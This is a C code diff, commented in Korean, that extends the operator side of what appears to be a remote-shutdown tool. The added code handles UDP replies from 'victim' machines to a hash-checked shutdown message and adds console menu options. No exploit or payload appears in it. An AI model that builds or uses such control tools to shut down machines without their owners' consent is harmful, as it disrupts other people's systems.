@@ -183,6 +183,22 @@ int shutdownMessageSender(int number)
 		retval = sendto(sock, buffer, (int)strlen(buffer) + 1, 0, (SOCKADDR*)& victimaddr, sizeof(victimaddr));
 		if (retval == SOCKET_ERROR)
 			err_quit("sendto()");
+
+		//피해자의 응답을 수신한다.
+		retval = recvfrom(sock, buffer, sizeof(buffer), 0, (SOCKADDR*)& peeraddr, &addrlen);
+		if (retval == SOCKET_ERROR)
+			err_quit("recvfrom()");
+
+		//응답을 처리한다.
+		if (strcmp(buffer, "Hash value is not match.") == 0)
+			continue;
+		else if (strcmp(buffer, "Shutdown process start.") == 0)
+			break;
+		else
+		{
+			printf("피해자 응답 오류! \n");
+			return 1;
+		}
 	}
 
 	//통신용 소켓을 닫는다.
@@ -230,6 +246,9 @@ int shutdownVictim()
 	if (retval != 0)
 		return 3;
 
+	//피해자 컴퓨터의 종료 과정이 시작됬음을 알린다.
+	printf("피해자 컴퓨터의 종료 과정이 시작됨! \n");
+
 	return 0;
 }
 
@@ -262,6 +281,8 @@ int main()
 		printf("\n");
 		puts("1. 피해자 목록 확인");
 		puts("2. 피해자 종료시키기");
+		puts("3. 콘솔창 지우기");
+		puts("4. 프로그램 종료");
 		printf("번호 입력 >>> ");
 		scanf_s("%d", &input);
 
@@ -273,16 +294,18 @@ int main()
 		case 2:
 			shutdownVictim();
 			break;
+		case 3:
+			system("cls");
+			break;
+		case 4:
+			//윈속을 종료한다.
+			retval = WSACleanup();
+			if (retval != 0)
+				err_display("WSACleanup()");
+			return 0;
 		default:
 			printf("번호를 잘못 입력했습니다. \n");
 			break;
 		}
 	}
-
-	//윈속을 종료한다.
-	retval = WSACleanup();
-	if (retval != 0)
-		err_display("WSACleanup()");
-
-	return 0;
 }
